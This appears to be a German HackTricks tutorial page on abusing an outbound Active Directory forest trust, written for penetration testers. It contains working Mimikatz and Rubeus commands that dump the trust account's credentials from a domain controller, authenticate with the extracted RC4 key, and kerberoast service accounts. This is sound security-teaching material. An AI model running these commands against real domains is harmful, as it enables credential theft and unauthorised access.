# Externer Forest-Domäne - Einweg (Ausgehend)

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories senden.

</details>

In diesem Szenario **vertraut Ihre Domäne** bestimmte **Berechtigungen** einem Prinzipal aus einer **anderen Domäne** an.

## Enumeration

### Ausgehendes Vertrauen
```powershell
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
## Trust Account Attack

Eine Sicherheitslücke besteht, wenn eine Vertrauensbeziehung zwischen zwei Domänen besteht, die hier als Domäne **A** und Domäne **B** bezeichnet werden, wobei Domäne **B** sein Vertrauen auf Domäne **A** ausdehnt. In dieser Konfiguration wird ein spezielles Konto in Domäne **A** für Domäne **B** erstellt, das eine entscheidende Rolle im Authentifizierungsprozess zwischen den beiden Domänen spielt. Dieses Konto, das mit Domäne **B** verbunden ist, wird verwendet, um Tickets zur Verschlüsselung für den Zugriff auf Dienste über die Domänen zu erstellen.

Der entscheidende Aspekt hierbei ist, dass das Passwort und der Hash dieses speziellen Kontos mithilfe eines Befehlszeilentools von einem Domänencontroller in Domäne **A** extrahiert werden können. Der Befehl, um diese Aktion auszuführen, lautet:
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
Diese Extraktion ist möglich, weil das Konto, das mit einem **$** nach seinem Namen identifiziert ist, aktiv ist und zur Gruppe "Domain Users" der Domäne **A** gehört und somit die mit dieser Gruppe verbundenen Berechtigungen erbt. Dadurch können Personen sich mit den Anmeldeinformationen dieses Kontos gegen Domäne **A** authentifizieren.

**Warnung:** Es ist möglich, diese Situation auszunutzen, um als Benutzer einen Fuß in der Domäne **A** zu fassen, wenn auch mit begrenzten Berechtigungen. Dieser Zugriff reicht jedoch aus, um eine Enumeration in der Domäne **A** durchzuführen.

In einem Szenario, in dem `ext.local` die vertrauende Domäne und `root.local` die vertraute Domäne ist, würde ein Benutzerkonto mit dem Namen `EXT$` in `root.local` erstellt werden. Mit speziellen Tools ist es möglich, die Kerberos-Vertrauensschlüssel abzurufen und somit die Anmeldeinformationen von `EXT$` in `root.local` offenzulegen. Der Befehl, um dies zu erreichen, lautet:
```bash
lsadump::trust /patch
```
Nachfolgend könnte man den extrahierten RC4-Schlüssel verwenden, um sich als `root.local\EXT$` in `root.local` mit einem anderen Befehlswerkzeug zu authentifizieren:
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
Dieser Authentifizierungsschritt eröffnet die Möglichkeit, Dienste innerhalb von `root.local` aufzulisten und sogar auszunutzen, z. B. durch Durchführen eines Kerberoast-Angriffs, um Servicekontenzugangsdaten mit folgendem Befehl zu extrahieren:
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### Sammeln des Klartext-Vertrauenspassworts

Im vorherigen Ablauf wurde anstelle des **Klartext-Passworts** (das auch von Mimikatz abgerufen wurde) der Vertrauenshash verwendet.

Das Klartext-Passwort kann erhalten werden, indem die Ausgabe \[ CLEAR ] von Mimikatz von hexadezimal in Klartext umgewandelt wird und Nullbytes '\x00' entfernt werden:

![](<../../.gitbook/assets/image (2) (1) (2) (1).png>)

Manchmal muss bei der Erstellung einer Vertrauensbeziehung ein Passwort vom Benutzer eingegeben werden. In dieser Demonstration ist der Schlüssel das ursprüngliche Vertrauenspasswort und daher lesbar. Da der Schlüssel zyklisch ist (30 Tage), wird der Klartext nicht lesbar sein, aber technisch immer noch verwendbar.

Das Klartext-Passwort kann verwendet werden, um eine reguläre Authentifizierung als Vertrauenskonto durchzuführen, anstelle eines TGT unter Verwendung des Kerberos-Schlüssels des Vertrauenskontos anzufordern. Hier wird root.local von ext.local nach Mitgliedern von Domain Admins abgefragt:

![](<../../.gitbook/assets/image (1) (1) (1) (2).png>)

## Referenzen

* [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
